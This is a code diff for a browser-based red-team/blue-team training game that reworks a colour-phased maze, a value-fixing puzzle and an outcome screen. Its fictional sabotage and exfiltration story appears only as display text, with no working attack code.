+  [ 0, 1, 0, 0, 0, 2, 0, 3, 0, 0, 0, 1, 0 ],  // row 0 (top)
+  [ 0, 1, 0, 1, 0, 2, 0, 3, 1, 1, 0, 1, 0 ],  // row 1
+  [ 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0 ],  // row 2
+  [ 1, 1, 0, 1, 2, 2, 1, 1, 0, 1, 3, 3, 0 ],  // row 3
+  [ 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0 ],  // row 4
+  [ 0, 1, 1, 1, 1, 2, 0, 1, 2, 2, 0, 1, 0 ],  // row 5
+  [ 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0 ],  // row 6 (center)
+  [ 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 3 ],  // row 7
+  [ 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0 ],  // row 8
+  [ 0, 1, 2, 2, 1, 0, 1, 0, 3, 3, 1, 1, 0 ],  // row 9
+  [ 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0 ],  // row 10
+  [ 0, 0, 0, 1, 1, 1, 2, 1, 0, 1, 0, 1, 1 ],  // row 11
+  [ 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0 ],  // row 12 (bottom, START at 0,12)
+];
+
+const WALL_COLORS = {
+  1: { fill:'#111111', stroke:'#333333', label:'BLACK'  },
+  2: { fill:'#555555', stroke:'#888888', label:'GREY'   },
+  3: { fill:'#bbbbbb', stroke:'#dddddd', label:'WHITE'  },
+};
+
+function wallPassable(wallType) {
+  // Black walls: passable in phase ≥ 1 (never — they are walls)
+  // Actually: wall type N is passable only when phase >= N
+  // So: black (1) = always wall (never passable), grey (2) phase≥2, white (3) phase≥3
+  // Wait — re-reading the user: BLACK→GREY→WHITE walls can only be TRAVERSED in that order
+  // Meaning phase 1: can cross black walls; phase 2: can cross grey walls; phase 3: can cross white walls
+  if (wallType === 1 && mazePhase >= 1) return true;
+  if (wallType === 2 && mazePhase >= 2) return true;
+  if (wallType === 3 && mazePhase >= 3) return true;
+  return false;
+}
+
 function drawMaze() {
-  const canvas = document.getElementById('mazeCanvas');
-  const ctx = canvas.getContext('2d');
-  ctx.clearRect(0,0,300,300);
-  for (let r=0;r<ROWS;r++) for (let c=0;c<COLS;c++) {
-    const x=c*CELL, y=r*CELL;
-    if (mazeGrid[r][c]===1) {
-      ctx.fillStyle='#0e1a28'; ctx.fillRect(x,y,CELL,CELL);
-      ctx.strokeStyle='rgba(255,74,74,0.2)'; ctx.strokeRect(x+0.5,y+0.5,CELL-1,CELL-1);
-    } else {
-      ctx.fillStyle='#060d18'; ctx.fillRect(x,y,CELL,CELL);
+  const ctx = mazeCanvas.getContext('2d');
+  ctx.clearRect(0,0,CANVAS_W,CANVAS_H);
+
+  for (let r = 0; r < ROWS; r++) {
+    for (let c = 0; c < COLS; c++) {
+      const x = c * CELL, y = r * CELL;
+      const cell = mazeGrid[r][c];
+      if (cell === 0) {
+        ctx.fillStyle = '#060d18';
+        ctx.fillRect(x, y, CELL, CELL);
+      } else {
+        const wc = WALL_COLORS[cell];
+        ctx.fillStyle = wc.fill;
+        ctx.fillRect(x, y, CELL, CELL);
+        ctx.strokeStyle = wc.stroke;
+        ctx.lineWidth = 0.5;
+        ctx.strokeRect(x+0.5, y+0.5, CELL-1, CELL-1);
+        // Mark walls passable in current phase with subtle tint
+        if (wallPassable(cell)) {
+          ctx.fillStyle = cell === 1 ? 'rgba(74,158,255,0.12)' : cell === 2 ? 'rgba(245,197,66,0.1)' : 'rgba(61,220,132,0.1)';
+          ctx.fillRect(x, y, CELL, CELL);
+        }
+      }
     }
   }
-  // Goal
-  ctx.fillStyle='rgba(255,74,74,0.3)'; ctx.fillRect(goal.x*CELL,goal.y*CELL,CELL,CELL);
-  ctx.fillStyle='#ff4a4a'; ctx.font='16px serif';
-  ctx.fillText('⬛', goal.x*CELL+6, goal.y*CELL+20);
-  ctx.fillStyle='rgba(255,74,74,0.6)'; ctx.font='10px Share Tech Mono'; ctx.fillText('SRV',goal.x*CELL+2,goal.y*CELL+27);
+
+  // Phase checkpoints
+  phaseGoals.forEach((pg, i) => {
+    if (i === phasesCompleted) {
+      const x = pg.x * CELL, y = pg.y * CELL;
+      ctx.fillStyle = i === 2 ? 'rgba(255,74,74,0.3)' : 'rgba(245,197,66,0.2)';
+      ctx.fillRect(x, y, CELL, CELL);
+      ctx.fillStyle = i === 2 ? '#ff4a4a' : '#f5c542';
+      ctx.font = 'bold 9px Share Tech Mono, monospace';
+      ctx.textAlign = 'center';
+      ctx.fillText(i === 2 ? 'GOAL' : 'CP'+(i+1), x+CELL/2, y+CELL/2+3);
+    }
+  });
+
   // Player
-  ctx.fillStyle='rgba(255,74,74,0.8)'; ctx.fillRect(playerPos.x*CELL+6,playerPos.y*CELL+6,18,18);
-  ctx.fillStyle='#ff4a4a'; ctx.font='10px Share Tech Mono'; ctx.fillText('YOU',playerPos.x*CELL+2,playerPos.y*CELL+27);
+  ctx.fillStyle = 'rgba(74,158,255,0.9)';
+  ctx.fillRect(playerPos.x*CELL+4, playerPos.y*CELL+4, CELL-8, CELL-8);
+  ctx.fillStyle = '#4a9eff';
+  ctx.font = '8px Share Tech Mono, monospace';
+  ctx.textAlign = 'center';
+  ctx.fillText('YOU', playerPos.x*CELL+CELL/2, playerPos.y*CELL+CELL/2+3);
+
+  // START label
+  ctx.fillStyle = 'rgba(74,158,255,0.4)';
+  ctx.font = '7px Share Tech Mono, monospace';
+  ctx.textAlign = 'center';
+  ctx.fillText('START', 0+CELL/2, 12*CELL+CELL-3);
+
   // Grid lines
-  ctx.strokeStyle='rgba(74,158,255,0.06)';
-  for(let i=0;i<=COLS;i++){ ctx.beginPath(); ctx.moveTo(i*CELL,0); ctx.lineTo(i*CELL,300); ctx.stroke(); }
-  for(let j=0;j<=ROWS;j++){ ctx.beginPath(); ctx.moveTo(0,j*CELL); ctx.lineTo(300,j*CELL); ctx.stroke(); }
+  ctx.strokeStyle = 'rgba(74,158,255,0.04)';
+  ctx.lineWidth = 0.5;
+  for (let i = 0; i <= COLS; i++) { ctx.beginPath(); ctx.moveTo(i*CELL,0); ctx.lineTo(i*CELL,CANVAS_H); ctx.stroke(); }
+  for (let j = 0; j <= ROWS; j++) { ctx.beginPath(); ctx.moveTo(0,j*CELL); ctx.lineTo(CANVAS_W,j*CELL); ctx.stroke(); }
+}
+
+function updateMazePhaseUI() {
+  const phaseNames = ['—','BLACK','GREY','WHITE'];
+  const phaseColors = ['','#aaa','#888','#ddd'];
+  document.getElementById('mazePhaseText').textContent = phaseNames[mazePhase] + ' WALLS ACTIVE';
+  document.getElementById('mazePhaseText').style.color = phaseColors[mazePhase];
+  const zones = [];
+  if (mazePhase >= 1) zones.push('<span style="color:#aaa">BLACK</span>');
+  if (mazePhase >= 2) zones.push('<span style="color:#888">GREY</span>');
+  if (mazePhase >= 3) zones.push('<span style="color:#ddd">WHITE</span>');
+  document.getElementById('mazeZonesText').innerHTML = zones.join(' + ') || 'none';
 }
 
 function mazeMove(dir) {
-  let nx=playerPos.x, ny=playerPos.y;
-  if(dir==='up')    ny--;
-  if(dir==='down')  ny++;
-  if(dir==='left')  nx--;
-  if(dir==='right') nx++;
-  if(nx<0||ny<0||nx>=COLS||ny>=ROWS) return;
-  if(mazeGrid[ny][nx]===1) {
-    document.getElementById('mazeStatus').textContent = '⚠ Blocked — find another path';
+  let nx = playerPos.x, ny = playerPos.y;
+  if (dir==='up')    ny--;
+  if (dir==='down')  ny++;
+  if (dir==='left')  nx--;
+  if (dir==='right') nx++;
+  if (nx<0||ny<0||nx>=COLS||ny>=ROWS) return;
+  const cell = mazeGrid[ny][nx];
+  if (cell !== 0 && !wallPassable(cell)) {
+    const wc = WALL_COLORS[cell] || {};
+    const needed = cell === 2 ? 'GREY phase (reach checkpoint 1 first)' : 'WHITE phase (reach checkpoint 2 first)';
+    document.getElementById('mazeStatus').textContent = `⚠ BLOCKED — ${wc.label || ''} wall requires ${needed}`;
     return;
   }
-  playerPos={x:nx,y:ny};
+  playerPos = {x:nx, y:ny};
   drawMaze();
-  if(nx===goal.x && ny===goal.y) {
-    document.getElementById('mazeStatus').textContent = '✓ Server reached — deploying script...';
-    document.getElementById('redProgress').textContent = 'STEP 2/2';
-    setTimeout(() => {
-      document.getElementById('red-s1').classList.remove('active');
-      document.getElementById('red-s2').classList.add('active');
-    }, 800);
+
+  // Check phase checkpoints
+  const pg = phaseGoals[phasesCompleted];
+  if (nx === pg.x && ny === pg.y) {
+    phasesCompleted++;
+    if (phasesCompleted === 1) {
+      mazePhase = 2;
+      document.getElementById('mazeStatus').textContent = '✓ Checkpoint 1 reached — GREY walls now passable. Continue to checkpoint 2.';
+      updateMazePhaseUI(); drawMaze(); return;
+    }
+    if (phasesCompleted === 2) {
+      mazePhase = 3;
+      document.getElementById('mazeStatus').textContent = '✓ Checkpoint 2 reached — WHITE walls now passable. Reach the GOAL.';
+      updateMazePhaseUI(); drawMaze(); return;
+    }
+    if (phasesCompleted === 3) {
+      // GOAL!
+      document.getElementById('mazeStatus').textContent = '✓ SERVER ROOM REACHED — deploying cleanup script...';
+      document.getElementById('redProgress').textContent = 'STEP 2/2';
+      setTimeout(() => {
+        document.getElementById('red-s1').classList.remove('active');
+        document.getElementById('red-s2').classList.add('active');
+      }, 900);
+    }
   }
 }
 
-// Keyboard controls
+// Keyboard
 document.addEventListener('keydown', e => {
   if (!redLane.classList.contains('active')) return;
-  const map = { ArrowUp:'up', ArrowDown:'down', ArrowLeft:'left', ArrowRight:'right', w:'up', s:'down', a:'left', d:'right' };
-  if(map[e.key]) { e.preventDefault(); mazeMove(map[e.key]); }
+  const map = { ArrowUp:'up', ArrowDown:'down', ArrowLeft:'left', ArrowRight:'right', w:'up', s:'down', a:'left', d:'right', W:'up', S:'down', A:'left', D:'right' };
+  if (map[e.key]) { e.preventDefault(); mazeMove(map[e.key]); }
 });
 
-// ── Code fix ──────────────────────────────────────────────────
-const codeFixes = { ce1: false, ce2: false, ce3: false };
+// Init maze
+drawMaze(); updateMazePhaseUI();
+
+// ══════════════════════════════════
+// RED — Step 2: Code fix
+// ══════════════════════════════════
+const codeErrors = { ce1:false, ce2:false, ce3:false, ce4:false, ce5:false, ce5b:false };
 
 function editCode(el, id, correct) {
-  const cur = el.textContent.replace(/^"|"$/g,'').replace(/&quot;/g,'"');
-  const val = prompt(`Fix line — enter correct value:`, cur.replace(/"/g,''));
+  const val = prompt('Fix the value (enter correct string):', el.textContent.replace(/^"|"$/g,''));
   if (val === null) return;
-  const trimmed = val.trim();
-  if (trimmed === correct) {
-    el.textContent = `"${trimmed}"`;
-    el.style.cssText = 'color:var(--green);background:rgba(61,220,132,0.1);';
-    el.onclick = null; el.style.cursor='default';
-    codeFixes[id] = true;
+  if (val.trim() === correct) {
+    el.textContent = `"${correct}"`;
+    el.className = 'fix'; el.onclick = null; el.style.cursor='default';
+    codeErrors[id] = true;
   } else {
-    el.style.animation='none'; el.offsetHeight; el.style.animation='';
-    el.style.color='var(--red)';
-    alert('Incorrect — re-examine the comments and reference data.');
+    el.style.animation='none'; el.offsetHeight;
+    alert('Incorrect — check the comment on that line.');
   }
 }
 
-// Fix ce3 (shred passes — just a number, no quotes)
-document.getElementById('ce3').onclick = function() {
-  const val = prompt('Fix shred passes (must be > 0 and secure):', '0');
-  if(val === null) return;
-  if(val.trim() === '7') {
-    this.textContent = '7';
-    this.style.cssText = 'color:var(--green);background:rgba(61,220,132,0.1);';
-    this.onclick = null; this.style.cursor='default';
-    codeFixes.ce3 = true;
+function editNum(el, id, correct) {
+  const val = prompt('Fix the numeric value:', el.textContent);
+  if (val === null) return;
+  const parsed = parseFloat(val.trim());
+  if (parsed === correct) {
+    el.textContent = String(correct);
+    el.className = 'fix'; el.onclick = null; el.style.cursor='default';
+    codeErrors[id] = true;
   } else {
-    alert('Incorrect — shred requires 7 passes for secure overwrite.');
+    el.style.animation='none'; el.offsetHeight;
+    alert('Incorrect — re-read the comment. The standard value is specified.');
   }
-};
+}
 
-function checkCode() {
-  const allFixed = codeFixes.ce1 && codeFixes.ce2 && codeFixes.ce3;
+function checkRedCode() {
   const fb = document.getElementById('red-s2-fb');
-  if (allFixed) {
-    fb.textContent = '✓ All errors fixed — executing cleanup script...';
+  const done = Object.values(codeErrors).filter(Boolean).length;
+  const total = Object.keys(codeErrors).length;
+  if (done === total) {
+    fb.textContent = '✓ All errors corrected. Script executing... Wipe complete. Exfil bundle transmitted to relay. AIS spoofed. OPERATION CUTLINE — COVER COMPLETE.';
     fb.className = 'feedback show ok';
-    setTimeout(signalMyFinish, 700);
+    redLane.classList.add('won');
+    setTimeout(signalFinish, 700);
   } else {
-    const remaining = Object.values(codeFixes).filter(v=>!v).length;
-    fb.textContent = `✗ ${remaining} error(s) still present — click the red highlighted values to fix them.`;
+    fb.textContent = `✗ ${total - done} error(s) remaining — click all red underlined values to fix them.`;
     fb.className = 'feedback show err';
   }
 }
 
-// ── Draw maze on load ─────────────────────────────────────────
-drawMaze();
+// ══════════════════════════════════
+// OUTCOME
+// ══════════════════════════════════
+let finished = false;
+function signalFinish() {
+  if (finished) return;
+  finished = true;
+  clearInterval(timerInterval);
+  const elapsed = document.getElementById('timerDisplay').textContent;
+  const winner = team === 'blue' ? 'BLUE TEAM' : 'RED TEAM';
+  const title  = team === 'blue' ? 'NETWORK RESTORED' : 'EXFILTRATION COMPLETE';
+  const color  = team === 'blue' ? '#4a9eff' : '#ff4a4a';
+  const sub    = team === 'blue'
+    ? 'The cable repair vessel has received coordinates. Network partitioning reversed. KNYAZ VLADIMIR logged and tracked. Intelligence package transmitted to NATO command. Proceed to UN crisis simulation debrief.'
+    : 'Data exfiltrated. AIS records spoofed. Wipe scripts executed. The trail leads to a Tanzanian-flagged vessel with no living paper trail. Operation Cutline — phase complete. Proceed to UN debrief as adversary counsel.';
+
+  document.getElementById('outcomeTitle').textContent = title;
+  document.getElementById('outcomeTitle').style.color = color;
+  document.getElementById('outcomeTime').textContent   = elapsed;
+  document.getElementById('outcomeWinner').textContent = winner;
+  document.getElementById('outcomeSub').textContent    = sub;
+  document.getElementById('outcomeOverlay').classList.add('show');
+
+  // Confetti for blue win
+  if (team === 'blue') {
+    for (let i=0;i<40;i++) {
+      const d = document.createElement('div');
+      d.style.cssText = `position:fixed;width:6px;height:6px;border-radius:50%;background:${['#4a9eff','#3ddc84','#f5c542'][i%3]};left:${Math.random()*100}vw;top:-10px;animation:confettiFall ${2+Math.random()*2}s ${Math.random()}s linear forwards;pointer-events:none;z-index:300`;
+      document.body.appendChild(d);
+    }
+  }
+}
 </script>
+<style>
+@keyframes confettiFall {
+  0%   { transform:translateY(-20px) rotate(0deg); opacity:1; }
+  100% { transform:translateY(100vh) rotate(540deg); opacity:0; }
+}
+</style>
 </body>
 </html>
